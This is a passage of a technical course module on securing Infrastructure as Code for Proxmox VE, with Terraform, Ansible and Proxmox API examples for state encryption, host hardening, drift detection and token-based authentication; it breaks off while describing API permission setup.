# Automation Security and Infrastructure as Code for Virtual Environments

> **Module:** Migrazione VMware -> Proxmox VE
> **Position in curriculum:** Security Deep-Dive -- Module 27 (advanced automation security)
> **Prerequisites:** Modules 01-02 (VMware/Proxmox fundamentals), Module 12 (Security & Compliance), Module 14 (Automation & IaC basics), Module 20 (Hypervisor Security Hardening); working knowledge of Terraform, Ansible, Git, CI/CD pipelines, REST APIs, PKI/TLS, Linux administration.
> **Learning objectives.** Upon completion the student will be able to:
> 1. Identify and mitigate security risks inherent in Infrastructure as Code workflows -- state file exposure, credential leakage, drift exploitation;
> 2. Provision and configure Proxmox VMs/containers via Terraform with secure state management and encrypted remote backends;
> 3. Automate hypervisor and VM hardening with Ansible playbooks and detect configuration drift;
> 4. Secure the Proxmox REST API through token scoping, TLS hardening, rate limiting, and CSRF prevention;
> 5. Integrate secrets management (HashiCorp Vault, Ansible Vault, SOPS) into IaC pipelines with zero hardcoded credentials;
> 6. Enforce policy as code using OPA/Rego, Conftest, and Sentinel to validate infrastructure changes before apply;
> 7. Design CI/CD pipelines for infrastructure with approval gates, testing, blue-green deployment, and rollback;
> 8. Threat-model IaC supply chains -- malicious PRs, compromised providers, state file exposure, pipeline privilege escalation;
> 9. Implement continuous compliance monitoring with drift detection, CIS checks, and audit evidence collection;
> 10. Build an end-to-end secure IaC lab: GitLab CI + Terraform + Ansible + Vault + Proxmox.
> **Estimated time:** reading 3-4 hours; lab implementation 16-24 hours
> **Level:** Expert (Dreyfus 5); offensive security mindset required
> **Last update:** 2026-05-07
> **Reference versions:** Proxmox VE 8.x, Terraform 1.7+, Telmate/proxmox provider 3.x, Ansible 2.16+ / ansible-core 2.16, community.general 9.x, HashiCorp Vault 1.15+, OPA 0.62+, GitLab CI 17.x
> **Audience:** Senior IT professionals, ethical hackers, infrastructure security architects

---

## Table of Contents

1. [IaC Security Fundamentals](#1-iac-security-fundamentals)
2. [Terraform for Proxmox](#2-terraform-for-proxmox)
3. [Ansible for Virtual Infrastructure](#3-ansible-for-virtual-infrastructure)
4. [Proxmox API Security](#4-proxmox-api-security)
5. [Secrets Management for IaC](#5-secrets-management-for-iac)
6. [Policy as Code for Virtual Infrastructure](#6-policy-as-code-for-virtual-infrastructure)
7. [CI/CD for Infrastructure](#7-cicd-for-infrastructure)
8. [Security Risks of IaC](#8-security-risks-of-iac)
9. [Monitoring and Compliance](#9-monitoring-and-compliance)
10. [Lab: Secure IaC Pipeline](#10-lab-secure-iac-pipeline)

---

## 1. IaC Security Fundamentals

Infrastructure as Code transforms infrastructure management from manual, undocumented procedures into version-controlled, auditable, repeatable declarations. This transformation brings enormous security benefits -- and introduces entirely new attack surfaces. This section establishes the security principles that underpin every subsequent chapter.

### 1.1 Infrastructure Drift as Security Risk

Infrastructure drift occurs when the actual state of deployed resources diverges from the declared desired state in code. In traditional environments, drift is an operational nuisance. In security-critical virtual infrastructure, drift is a vulnerability.

**How drift creates security gaps:**

- A firewall rule added manually to a Proxmox node bypasses the code review process entirely. No peer review, no audit trail in git, no policy-as-code validation.
- A VM resized via the GUI may exceed resource limits that the IaC policy enforces, creating a denial-of-service vector against co-tenant workloads.
- A storage backend changed from encrypted to unencrypted outside IaC leaves sensitive data at rest unprotected while the state file still shows encryption enabled.
- Network interfaces added manually can bridge security zones that Terraform configurations intentionally isolate.

Drift is not merely a deviation from "clean" infrastructure. Drift is a mechanism by which an attacker who gains limited access -- say, a compromised monitoring account with GUI access -- can silently weaken security controls without triggering any IaC pipeline alert.

**Mitigation:**

- Run periodic `terraform plan` in read-only mode and alert on any diff.
- Use Ansible `--check --diff` runs on a cron to detect configuration drift on hosts.
- Treat any manually-applied change as a security incident requiring investigation and remediation through the IaC pipeline.

### 1.2 State File as Crown Jewels -- Secrets Exposure in tfstate

Terraform state files (`terraform.tfstate`) are the single most sensitive artifact in a Terraform workflow. They contain the full resource graph including every attribute Terraform knows about -- and that includes secrets.

**What leaks into state files:**

- Proxmox API token secrets passed to the provider
- VM disk encryption passphrases if managed through Terraform
- Cloud-init userdata containing SSH keys, bootstrap credentials
- Database passwords provisioned via Terraform
- TLS private keys generated by `tls_private_key` resources

The state file is stored in plaintext JSON by default. A local state file on a developer workstation, committed to git, or stored on an unencrypted S3 bucket is a credential dump waiting to be discovered.

```json
{
  "resources": [
    {
      "type": "proxmox_vm_qemu",
      "instances": [
        {
          "attributes": {
            "name": "web-prod-01",
            "cipassword": "SuperSecretPassword123!",
            "sshkeys": "ssh-rsa AAAA...root@deploy",
            "ipconfig0": "ip=10.50.1.10/24,gw=10.50.1.1"
          }
        }
      ]
    }
  ]
}
```

**Hardening state files:**

1. Never store state locally in production workflows. Use a remote backend with encryption.
2. Enable server-side encryption (SSE-S3/SSE-KMS for S3, encryption at rest for Consul, Vault transit encryption for Vault backend).
3. Enable state locking to prevent concurrent modifications that could corrupt state or create race conditions.
4. Restrict access to state storage to the CI/CD pipeline service account only -- no human should read raw state.
5. Use `terraform state pull` sparingly and only through audited sessions.
6. Mark sensitive outputs with `sensitive = true` to prevent them from appearing in plan output.

### 1.3 Credential Management for IaC Tools

Every IaC tool requires credentials to interact with the infrastructure it manages. These credentials are high-value targets because they typically have broad permissions -- they must create, modify, and destroy infrastructure.

**Credential hierarchy (least to most privileged):**

| Credential Type | Scope | Risk |
|----------------|-------|------|
| Read-only API token | Inventory, state refresh | Low -- cannot modify infrastructure |
| Scoped write token | Specific resource types | Medium -- limited blast radius |
| Full admin token | All operations | Critical -- full infrastructure control |
| Root/PAM credentials | Hypervisor OS access | Critical -- hypervisor compromise |

**Secure patterns:**

- Use short-lived, dynamically generated credentials from a secrets manager (Vault, AWS STS) rather than long-lived static tokens.
- Scope tokens to the minimum required permissions for each pipeline stage: plan needs read-only, apply needs scoped write.
- Rotate credentials on a schedule and immediately upon suspected compromise.
- Never pass credentials via command-line arguments (visible in `/proc` and shell history).
- Inject credentials via environment variables or files with restricted permissions (`0600`).

### 1.4 Idempotency and Security -- Ensuring Desired State Enforcement

Idempotency -- the property that applying the same configuration multiple times produces the same result -- is a cornerstone of IaC. From a security perspective, idempotency means that the security posture declared in code is continuously enforced.

If a configuration is truly idempotent:
- An attacker who modifies a firewall rule will have that rule reverted on the next apply.
- A misconfigured SSH daemon will be corrected without manual intervention.
- Encryption settings cannot silently degrade between runs.

**Where idempotency breaks:**

- Terraform resources with `ignore_changes` lifecycle blocks -- explicitly telling Terraform to ignore drift on specific attributes. If `ignore_changes` includes security-relevant attributes, drift on those attributes is invisible.
- Ansible tasks using `shell` or `command` modules without proper `creates`/`removes` guards or `changed_when` conditions.
- One-shot provisioners (`remote-exec`, `local-exec`) that run only on resource creation, not on subsequent applies.

**Security recommendation:** Audit all `ignore_changes` blocks and provisioner usage. Each one is a potential security blind spot.

### 1.5 Immutable Infrastructure Security Benefits

Immutable infrastructure treats deployed resources as disposable. Instead of updating a running VM, you build a new VM image with the changes and replace the old one. The running instance is never modified in place.

**Security advantages:**

- **Eliminates configuration drift by design.** There is nothing to drift -- the instance runs exactly what the image contains.
- **Reduces attack persistence.** An attacker who compromises a running instance loses access when the instance is replaced. There is no "patch the running system" -- there is only "deploy a new clean image."
- **Simplifies forensics.** The known-good state is the image. Any deviation on a running instance is, by definition, suspicious.
- **Eliminates patching windows.** New images with security patches are built and deployed through the pipeline. No SSH into production to run `apt upgrade`.

**Implementation with Proxmox:**

Build VM templates with Packer, store them as Proxmox templates, and provision instances from those templates via Terraform. When a change is needed, build a new template, update the Terraform configuration to reference the new template, and let the pipeline replace the instances.

### 1.6 GitOps Security Model for Infrastructure

GitOps applies Git as the single source of truth for infrastructure state. All changes go through git commits, pull requests, and code review. The deployed infrastructure is a reflection of the git repository.

**Security properties of GitOps:**

- **Audit trail.** Every infrastructure change is a git commit with author, timestamp, message, and diff. `git log` is your change audit log.
- **Mandatory review.** Branch protection rules enforce that no change reaches the main branch without peer review.
- **Rollback capability.** `git revert` on an infrastructure commit, followed by a pipeline run, rolls back the infrastructure change.
- **Separation of duties.** The person who writes the change is not the person who approves it.
- **Blast radius limitation.** Changes are scoped to what the PR modifies. No "while I was in there" unreviewed changes.

**GitOps threat model:**

- A compromised developer account can submit malicious PRs. Mitigation: require multiple approvals, enforce branch protection, use signed commits.
- A compromised CI runner can apply malicious changes. Mitigation: runner hardening (section 7), ephemeral runners, scoped credentials.
- A compromised git repository can inject malicious IaC. Mitigation: repository access controls, audit logs, signed commits, protected branches.

---

## 2. Terraform for Proxmox

### 2.1 Telmate/proxmox Terraform Provider -- Authentication and Configuration

The `Telmate/proxmox` provider is the primary community Terraform provider for Proxmox VE. It communicates with the Proxmox REST API to manage VMs, containers, storage, and networking.

**Provider configuration:**

```hcl
terraform {
  required_version = ">= 1.7.0"

  required_providers {
    proxmox = {
      source  = "Telmate/proxmox"
      version = "~> 3.0.1-rc4"
    }
  }
}

provider "proxmox" {
  pm_api_url          = "https://pve-mgmt.internal:8006/api2/json"
  pm_api_token_id     = "terraform@pve!iac-token"
  pm_api_token_secret = var.proxmox_api_token_secret

  # TLS verification -- NEVER disable in production
  pm_tls_insecure = false

  # Parallel operations -- limit to prevent API overload
  pm_parallel = 2

  # Logging for debugging (disable in production -- logs may contain secrets)
  pm_log_enable = false
  pm_log_file   = "/var/log/terraform-proxmox.log"
  pm_log_levels = {
    _default    = "debug"
    _capturelog = ""
  }
}
```

**Authentication methods (security implications):**

| Method | Configuration | Security Notes |
|--------|--------------|----------------|
| API Token | `pm_api_token_id` + `pm_api_token_secret` | Preferred. No CSRF token needed. Can be scoped. |
| Username/Password | `pm_user` + `pm_password` | Discouraged. Uses ticket auth internally. Requires CSRF. |
| Environment vars | `PM_API_TOKEN_ID`, `PM_API_TOKEN_SECRET` | Good for CI. Avoids hardcoding in HCL. |

**Critical security rule:** Never set `pm_tls_insecure = true` in production. If your Proxmox cluster uses self-signed certificates, add the CA to the system trust store on the machine running Terraform rather than disabling verification.

**Variable definition for secrets (never in `.tf` files):**

```hcl
variable "proxmox_api_token_secret" {
  type        = string
  sensitive   = true
  description = "API token secret for Terraform service account"
}
```

Pass via environment variable:

```bash
export TF_VAR_proxmox_api_token_secret="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
terraform plan
```

### 2.2 Provisioning VMs and Containers -- Resource Definitions

**VM resource (`proxmox_vm_qemu`):**

```hcl
resource "proxmox_vm_qemu" "web_server" {
  name        = "web-prod-01"
  target_node = "pve-node-01"
  vmid        = 200
  desc        = "Production web server - managed by Terraform"

  # Clone from hardened template
  clone    = "debian-12-hardened-template"
  os_type  = "cloud-init"
  qemu_os  = "l26"
  agent    = 1  # QEMU guest agent

  # Compute
  cores   = 4
  sockets = 1
  memory  = 8192
  cpu     = "host"
  numa    = true

  # Boot configuration
  boot     = "order=scsi0"
  scsihw   = "virtio-scsi-single"
  bios     = "ovmf"  # UEFI for Secure Boot support

  # Primary disk
  disks {
    scsi {
      scsi0 {
        disk {
          size    = "50G"
          storage = "local-zfs"
          iothread = true
          discard  = true
        }
      }
    }
  }

  # Network interface -- tagged VLAN on security zone bridge
  network {
    model  = "virtio"
    bridge = "vmbr1"
    tag    = 100  # Production VLAN
  }

  # Cloud-init configuration
  ipconfig0  = "ip=10.50.1.10/24,gw=10.50.1.1"
  nameserver = "10.50.1.2"
  ciuser     = "deploy"
  sshkeys    = file("~/.ssh/deploy_ed25519.pub")

  # Security: do NOT put passwords in cloud-init via Terraform
  # Use Vault-injected secrets post-provisioning via Ansible

  lifecycle {
    # Prevent accidental destruction of production VMs
    prevent_destroy = true

    # Do NOT use ignore_changes on security-relevant attributes
    # Each ignored attribute is a drift blind spot
  }

  tags = "terraform,production,web,hardened"
}
```

**LXC container resource (`proxmox_lxc`):**

```hcl
resource "proxmox_lxc" "monitoring" {
  hostname    = "mon-01"
  target_node = "pve-node-02"
  vmid        = 300

  ostemplate  = "local:vztmpl/debian-12-standard_12.2-1_amd64.tar.zst"
  password    = var.lxc_root_password  # sensitive variable
  unprivileged = true  # ALWAYS use unprivileged unless justified

  cores  = 2
  memory = 2048
  swap   = 512

  rootfs {
    storage = "local-zfs"
    size    = "20G"
  }

  network {
    name   = "eth0"
    bridge = "vmbr2"
    ip     = "10.50.2.10/24"
    gw     = "10.50.2.1"
    tag    = 200  # Monitoring VLAN
  }

  features {
    nesting = true   # Required for Docker-in-LXC
    keyctl  = true
    # mount   = ""   # Do NOT enable host mounts without justification
  }

  # Security: explicitly disable privileged features
  start  = true
  onboot = true

  tags = "terraform,monitoring,unprivileged"
}
```

### 2.3 Networking Configuration -- Bridges, VLANs, and SDN

Terraform can manage Proxmox networking at the VM/container level, assigning interfaces to specific bridges and VLAN tags. SDN configuration at the cluster level currently requires API calls or Ansible (the Telmate provider has limited SDN support as of 2026).

**Multi-NIC VM with VLAN tagging:**

```hcl
resource "proxmox_vm_qemu" "firewall_vm" {
  name        = "fw-prod-01"
  target_node = "pve-node-01"
  clone       = "opnsense-template"

  # WAN interface -- untagged on dedicated bridge
  network {
    model  = "virtio"
    bridge = "vmbr0"
  }

  # LAN interface -- VLAN 100 (production)
  network {
    model  = "virtio"
    bridge = "vmbr1"
    tag    = 100
  }

  # Management interface -- VLAN 999 (isolated management)
  network {
    model  = "virtio"
    bridge = "vmbr1"
    tag    = 999
  }
}
```

**Network segmentation strategy in Terraform:**

| Bridge | VLAN | Purpose | Firewall Policy |
|--------|------|---------|----------------|
| `vmbr0` | -- | WAN uplink | Strict ingress, NAT |
| `vmbr1` | 100 | Production workloads | Inter-VLAN routing restricted |
| `vmbr1` | 200 | Monitoring | Read-only access to all VLANs |
| `vmbr1` | 300 | Database tier | No direct internet, app-tier only |
| `vmbr1` | 999 | Management | Jumpbox access only, MFA required |

### 2.4 Storage Allocation and Encryption

```hcl
# Encrypted disk using LUKS-backed storage
resource "proxmox_vm_qemu" "db_server" {
  name        = "db-prod-01"
  target_node = "pve-node-03"
  clone       = "debian-12-hardened-template"

  disks {
    scsi {
      scsi0 {
        disk {
          size    = "100G"
          storage = "encrypted-zfs"  # ZFS pool with native encryption
          iothread = true
        }
      }
      scsi1 {
        disk {
          size    = "500G"
          storage = "encrypted-zfs"
          iothread = true
        }
      }
    }
  }
}
```

Storage encryption in Proxmox is typically configured at the storage pool level (ZFS native encryption or LUKS on LVM-thin), not per-VM in Terraform. Terraform provisions VMs onto the encrypted storage backends. The encryption keys themselves must be managed separately through Vault or the host's key management -- never in Terraform state.

### 2.5 State Management -- Remote State with Encryption and State Locking

**S3-compatible backend with encryption and locking:**

```hcl
terraform {
  backend "s3" {
    bucket         = "infra-terraform-state"
    key            = "proxmox/production/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "arn:aws:kms:us-east-1:123456789:key/mrk-xxxx"
    dynamodb_table = "terraform-state-lock"

    # Access via IAM role -- no static credentials
    # The CI runner assumes this role via OIDC federation
  }
}
```

**Consul backend (on-premise):**

```hcl
terraform {
  backend "consul" {
    address = "consul.internal:8501"
    scheme  = "https"
    path    = "terraform/proxmox/production"
    lock    = true

    # mTLS authentication
    ca_file   = "/etc/consul/ca.pem"
    cert_file = "/etc/consul/client.pem"
    key_file  = "/etc/consul/client-key.pem"
  }
}
```

**State locking** prevents two pipeline runs from modifying state simultaneously, which could lead to resource conflicts or state corruption. Both S3+DynamoDB and Consul backends support native locking. Always enable it.

### 2.6 Terraform Cloud/Enterprise for Team Workflows

Terraform Cloud (TFC) and Terraform Enterprise (TFE) add collaboration features on top of open-source Terraform:

- **Remote execution.** Plans and applies run in TFC's managed environment, not on developer workstations. This centralizes credential access.
- **State encryption at rest.** TFC encrypts state files with AES-256-GCM using per-workspace keys.
- **Sentinel policy enforcement.** Policy-as-code that runs between plan and apply, blocking non-compliant changes before they reach infrastructure (see section 6).
- **VCS integration.** Changes to the git repository automatically trigger plan runs, with apply gated behind approval.
- **Audit logging.** Every plan, apply, state access, and policy check is logged with user attribution.
- **Run-level permissions.** Fine-grained control over who can queue plans, approve applies, and access state.

For on-premise Proxmox environments where data sovereignty prevents using Terraform Cloud, Terraform Enterprise can be self-hosted. Alternatively, use the open-source workflow with a CI/CD pipeline (section 7) and external policy enforcement (section 6).

---

## 3. Ansible for Virtual Infrastructure

### 3.1 Proxmox Modules -- community.general.proxmox Collection

The `community.general` Ansible collection includes modules for managing Proxmox VE resources. These modules interact with the Proxmox API.

**Key modules:**

| Module | Purpose |
|--------|---------|
| `community.general.proxmox_kvm` | Create/manage KVM virtual machines |
| `community.general.proxmox` | Create/manage LXC containers |
| `community.general.proxmox_template` | Manage VM/container templates |
| `community.general.proxmox_disk` | Manage VM disks |
| `community.general.proxmox_nic` | Manage VM network interfaces |
| `community.general.proxmox_snap` | Manage snapshots |
| `community.general.proxmox_tasks_info` | Query task status |
| `community.general.proxmox_node_info` | Query node information |
| `community.general.proxmox_storage_info` | Query storage information |

**VM creation playbook:**

```yaml
---
- name: Provision hardened VMs on Proxmox
  hosts: localhost
  gather_facts: false
  vars:
    api_host: "pve-mgmt.internal"
    api_port: 8006
    api_token_id: "ansible@pve!automation"
    # api_token_secret injected via Ansible Vault or environment

  tasks:
    - name: Create production web server from template
      community.general.proxmox_kvm:
        api_host: "{{ api_host }}"
        api_port: "{{ api_port }}"
        api_token_id: "{{ api_token_id }}"
        api_token_secret: "{{ api_token_secret }}"
        validate_certs: true
        node: pve-node-01
        name: web-prod-01
        vmid: 200
        clone: debian-12-hardened-template
        full: true
        storage: local-zfs
        cores: 4
        memory: 8192
        net:
          net0: "virtio,bridge=vmbr1,tag=100"
        ipconfig:
          ipconfig0: "ip=10.50.1.10/24,gw=10.50.1.1"
        ciuser: deploy
        sshkeys: "{{ lookup('file', '~/.ssh/deploy_ed25519.pub') }}"
        onboot: true
        state: present
      register: vm_result

    - name: Start VM if not running
      community.general.proxmox_kvm:
        api_host: "{{ api_host }}"
        api_token_id: "{{ api_token_id }}"
        api_token_secret: "{{ api_token_secret }}"
        validate_certs: true
        node: pve-node-01
        vmid: 200
        state: started
      when: vm_result.changed
```

### 3.2 VMware Modules -- community.vmware Collection

For migration scenarios where both VMware and Proxmox coexist, the `community.vmware` collection manages ESXi/vCenter resources.

```yaml
---
- name: Inventory VMware VMs for migration assessment
  hosts: localhost
  gather_facts: false
  collections:
    - community.vmware

  tasks:
    - name: Gather all VM info from vCenter
      vmware_vm_info:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
      register: vmware_vms

    - name: Export VM inventory for migration planning
      ansible.builtin.copy:
        content: "{{ vmware_vms.virtual_machines | to_nice_yaml }}"
        dest: "/tmp/vmware_inventory_{{ ansible_date_time.date }}.yml"
        mode: "0600"

    - name: Identify VMs with snapshots (migration blockers)
      ansible.builtin.debug:
        msg: "VM {{ item.guest_name }} has {{ item.snapshots | length }} snapshot(s)"
      loop: "{{ vmware_vms.virtual_machines }}"
      when: item.snapshots | length > 0

    - name: Gather VM disk info for storage planning
      vmware_guest_disk_info:
        hostname: "{{ vcenter_hostname }}"
        username: "{{ vcenter_username }}"
        password: "{{ vcenter_password }}"
        validate_certs: true
        datacenter: "{{ vcenter_datacenter }}"
        name: "{{ item.guest_name }}"
      loop: "{{ vmware_vms.virtual_machines }}"
      register: disk_info
```

### 3.3 Inventory Management -- Dynamic Inventory from Hypervisor API

Static inventory files do not scale and introduce drift between the inventory and actual infrastructure. Dynamic inventory scripts query the hypervisor API at runtime.

**Proxmox dynamic inventory plugin (`proxmox.yml`):**

```yaml
---
plugin: community.general.proxmox
url: https://pve-mgmt.internal:8006
token_id: "ansible@pve!inventory"
token_secret: "{{ lookup('env', 'PROXMOX_TOKEN_SECRET') }}"
validate_certs: true

# Group VMs by tags
want_facts: true
want_proxmox_nodes_ansible_host: false

# Compose groups from VM metadata
groups:
  production: "'production' in (proxmox_tags_parsed | default([]))"
  webservers: "'web' in (proxmox_tags_parsed | default([]))"
  databases: "'database' in (proxmox_tags_parsed | default([]))"
  monitoring: "'monitoring' in (proxmox_tags_parsed | default([]))"

# Compose variables
compose:
  ansible_host: proxmox_ipconfig0.ip | default(proxmox_net0.ip) | regex_replace('/\\d+$', '')
  ansible_user: "'deploy'"
```

**VMware dynamic inventory (`vmware.yml`):**

```yaml
---
plugin: community.vmware.vmware_vm_inventory
hostname: "{{ lookup('env', 'VMWARE_HOST') }}"
username: "{{ lookup('env', 'VMWARE_USER') }}"
password: "{{ lookup('env', 'VMWARE_PASSWORD') }}"
validate_certs: true

with_tags: true
hostnames:
  - config.name

groups:
  linux_vms: "config.guestId is match('.*Linux.*')"
  windows_vms: "config.guestId is match('.*windows.*')"
```

### 3.4 Hardening Playbooks for Hypervisor Hosts

```yaml
---
- name: Harden Proxmox VE hosts
  hosts: proxmox_nodes
  become: true
  vars:
    allowed_ssh_users:
      - deploy
      - emergency-break-glass
    ntp_servers:
      - 10.50.0.10
      - 10.50.0.11

  tasks:
    # --- SSH Hardening ---
    - name: Configure SSH daemon
      ansible.builtin.template:
        src: templates/sshd_config.j2
        dest: /etc/ssh/sshd_config
        owner: root
        group: root
        mode: "0600"
        validate: "sshd -t -f %s"
      notify: Restart sshd

    - name: Disable root password authentication
      ansible.builtin.lineinfile:
        path: /etc/ssh/sshd_config
        regexp: "^#?PermitRootLogin"
        line: "PermitRootLogin prohibit-password"
        validate: "sshd -t -f %s"
      notify: Restart sshd

    # --- Firewall ---
    - name: Configure host firewall (pve-firewall)
      ansible.builtin.copy:
        content: |
          [OPTIONS]
          enable: 1
          policy_in: DROP
          policy_out: ACCEPT
          log_level_in: info

          [RULES]
          IN ACCEPT -source 10.50.0.0/16 -p tcp -dport 8006 -log info  # PVE Web UI
          IN ACCEPT -source 10.50.0.0/16 -p tcp -dport 22 -log info    # SSH
          IN ACCEPT -source 10.50.0.0/16 -p tcp -dport 3128 -log info  # SPICE proxy
          IN ACCEPT -source 10.50.0.0/16 -p tcp -dport 5900:5999       # VNC
          IN ACCEPT -source 10.50.0.0/16 -p udp -dport 5405:5412       # Corosync
          IN ACCEPT -source 10.50.0.0/16 -p tcp -dport 60000:60050     # Live migration
        dest: /etc/pve/local/host.fw
        owner: root
        group: www-data
        mode: "0640"

    # --- Automatic security updates ---
    - name: Install unattended-upgrades
      ansible.builtin.apt:
        name: unattended-upgrades
        state: present

    - name: Enable automatic security updates
      ansible.builtin.template:
        src: templates/50unattended-upgrades.j2
        dest: /etc/apt/apt.conf.d/50unattended-upgrades
        mode: "0644"

    # --- Audit logging ---
    - name: Install and configure auditd
      ansible.builtin.apt:
        name:
          - auditd
          - audispd-plugins
        state: present

    - name: Deploy audit rules for PVE-sensitive paths
      ansible.builtin.copy:
        content: |
          -w /etc/pve/ -p wa -k pve-config
          -w /etc/network/interfaces -p wa -k network-config
          -w /etc/ssh/sshd_config -p wa -k ssh-config
          -a always,exit -F arch=b64 -S execve -F euid=0 -k root-commands
        dest: /etc/audit/rules.d/pve-hardening.rules
        mode: "0600"
      notify: Restart auditd

    # --- Kernel hardening ---
    - name: Apply sysctl hardening
      ansible.posix.sysctl:
        name: "{{ item.key }}"
        value: "{{ item.value }}"
        sysctl_set: true
        reload: true
      loop:
        - { key: "net.ipv4.conf.all.rp_filter", value: "1" }
        - { key: "net.ipv4.conf.default.rp_filter", value: "1" }
        - { key: "net.ipv4.conf.all.accept_redirects", value: "0" }
        - { key: "net.ipv6.conf.all.accept_redirects", value: "0" }
        - { key: "net.ipv4.conf.all.send_redirects", value: "0" }
        - { key: "kernel.dmesg_restrict", value: "1" }
        - { key: "kernel.kptr_restrict", value: "2" }
        - { key: "net.ipv4.tcp_syncookies", value: "1" }

  handlers:
    - name: Restart sshd
      ansible.builtin.service:
        name: sshd
        state: restarted

    - name: Restart auditd
      ansible.builtin.service:
        name: auditd
        state: restarted
```

### 3.5 VM Template Management

```yaml
---
- name: Build and manage VM templates
  hosts: pve-node-01
  become: true
  vars:
    template_vmid: 9000
    template_name: "debian-12-hardened-template"
    cloud_image_url: "https://cloud.debian.org/images/cloud/bookworm/latest/debian-12-genericcloud-amd64.qcow2"
    cloud_image_checksum: "sha512:URL_TO_CHECKSUM_FILE"

  tasks:
    - name: Download cloud image with checksum verification
      ansible.builtin.get_url:
        url: "{{ cloud_image_url }}"
        dest: "/tmp/debian-12-cloud.qcow2"
        checksum: "{{ cloud_image_checksum }}"
        mode: "0644"

    - name: Create VM for template
      ansible.builtin.command:
        cmd: >
          qm create {{ template_vmid }}
          --name {{ template_name }}
          --cores 2
          --memory 2048
          --net0 virtio,bridge=vmbr1
          --bios ovmf
          --machine q35
          --agent enabled=1
          --ostype l26
        creates: "/etc/pve/qemu-server/{{ template_vmid }}.conf"

    - name: Import disk to template
      ansible.builtin.command:
        cmd: >
          qm importdisk {{ template_vmid }}
          /tmp/debian-12-cloud.qcow2
          local-zfs
      register: import_result
      changed_when: "'Successfully imported' in import_result.stdout"

    - name: Configure template hardware
      ansible.builtin.command:
        cmd: >
          qm set {{ template_vmid }}
          --scsihw virtio-scsi-single
          --scsi0 local-zfs:vm-{{ template_vmid }}-disk-0,iothread=1,discard=on
          --boot order=scsi0
          --ide2 local-zfs:cloudinit
          --serial0 socket
          --vga serial0
          --ipconfig0 ip=dhcp

    - name: Convert to template
      ansible.builtin.command:
        cmd: "qm template {{ template_vmid }}"
      register: template_result
      changed_when: template_result.rc == 0
      failed_when: template_result.rc != 0 and 'already a template' not in template_result.stderr
```

### 3.6 Configuration Drift Detection with Ansible

Ansible's `--check --diff` mode runs playbooks in dry-run, reporting what would change without applying changes. This is a powerful drift detection mechanism.

```bash
# Drift detection cron job
ansible-playbook \
  -i inventory/proxmox.yml \
  playbooks/hardening.yml \
  --check --diff \
  --output /var/log/ansible/drift-report-$(date +%Y%m%d).json \
  2>&1 | tee /var/log/ansible/drift-$(date +%Y%m%d).log

# Parse results and alert on drift
if grep -q "changed=" /var/log/ansible/drift-$(date +%Y%m%d).log; then
  # Send alert -- configuration drift detected
  curl -X POST https://alertmanager.internal/api/v1/alerts \
    -H "Content-Type: application/json" \
    -d '[{
      "labels": {
        "alertname": "InfrastructureDrift",
        "severity": "warning",
        "source": "ansible-drift-check"
      },
      "annotations": {
        "summary": "Configuration drift detected on Proxmox hosts",
        "description": "Ansible --check --diff found changes that would be applied"
      }
    }]'
fi
```

**Dedicated drift detection playbook:**

```yaml
---
- name: Detect drift on Proxmox hosts
  hosts: proxmox_nodes
  become: true
  tasks:
    - name: Check sshd configuration matches desired state
      ansible.builtin.template:
        src: templates/sshd_config.j2
        dest: /etc/ssh/sshd_config
      check_mode: true
      register: sshd_drift

    - name: Check firewall rules match desired state
      ansible.builtin.copy:
        src: files/host.fw
        dest: /etc/pve/local/host.fw
      check_mode: true
      register: fw_drift

    - name: Check sysctl hardening
      ansible.posix.sysctl:
        name: "{{ item.key }}"
        value: "{{ item.value }}"
      check_mode: true
      loop:
        - { key: "net.ipv4.conf.all.rp_filter", value: "1" }
        - { key: "kernel.dmesg_restrict", value: "1" }
      register: sysctl_drift

    - name: Report drift summary
      ansible.builtin.debug:
        msg: |
          DRIFT REPORT for {{ inventory_hostname }}:
          SSH config drifted: {{ sshd_drift.changed }}
          Firewall drifted: {{ fw_drift.changed }}
          Sysctl drifted: {{ sysctl_drift.results | selectattr('changed') | list | length > 0 }}
```

---

## 4. Proxmox API Security

### 4.1 REST API Architecture -- Authentication Tokens, Tickets, and CSRF Prevention

The Proxmox VE API is a RESTful HTTP API served on port 8006 (HTTPS). It supports two authentication mechanisms with different security properties.

**Ticket-based authentication (session cookies):**

```bash
# Obtain authentication ticket and CSRF token
curl -s -k \
  -d "username=admin@pam&password=REDACTED" \
  https://pve.internal:8006/api2/json/access/ticket \
  | jq '{ticket: .data.ticket, csrf: .data.CSRFPreventionToken}'

# Use ticket in subsequent requests -- CSRF token required for state-changing operations
curl -s \
  -b "PVEAuthCookie=PVE:admin@pam:XXXXXXXX::XXXXXXXX" \
  -H "CSRFPreventionToken: XXXXXXXX:XXXXXXXX" \
  -X POST \
  https://pve.internal:8006/api2/json/nodes/pve-01/qemu/200/status/start
```

Ticket authentication is designed for interactive browser sessions. The ticket has a 2-hour TTL. The `CSRFPreventionToken` header is mandatory for POST/PUT/DELETE requests to prevent cross-site request forgery -- a cookie-based session without CSRF protection would allow an attacker to forge requests from a victim's browser.

**API token authentication (preferred for automation):**

```bash
# API token -- no CSRF token needed
curl -s \
  -H "Authorization: PVEAPIToken=terraform@pve!iac-token=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" \
  https://pve.internal:8006/api2/json/nodes/pve-01/status

# State-changing operation -- no CSRF header required with API tokens
curl -s \
  -H "Authorization: PVEAPIToken=terraform@pve!iac-token=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" \
  -X POST \
  https://pve.internal:8006/api2/json/nodes/pve-01/qemu/200/status/start
```

**Critical distinction:** API tokens do NOT require the `CSRFPreventionToken` header. They are not cookie-based, so CSRF attacks do not apply. The token format is `PVEAPIToken=USER@REALM!TOKENID=UUID`. The `!TOKENID` separator and `=UUID` secret are distinct -- the token ID is not secret (it appears in ACLs and logs), but the UUID is the bearer credential.

### 4.2 API Permission Model -- Mapping ACLs to API Endpoints

Proxmox uses a path-based ACL system. Permissions are assigned on paths like `/vms/200`, `/storage/local-zfs`, `/nodes/pve-01`.

**ACL structure:**

```
pveum acl modify <path> --roles <role> --tokens <user@realm!tokenid>
```

**Example: Terraform service account with scoped permissions:**

```bash
# Create dedicated user for Terraform
pveum user add terraform@pve --comment "Terraform IaC service account"

# Create API token (privilege separation = 1 means token inherits user's privileges)
pveum user token add terraform@pve iac-token --privsep 1 --comment "Terraform automation"

# Create custom role with minimum required permissions
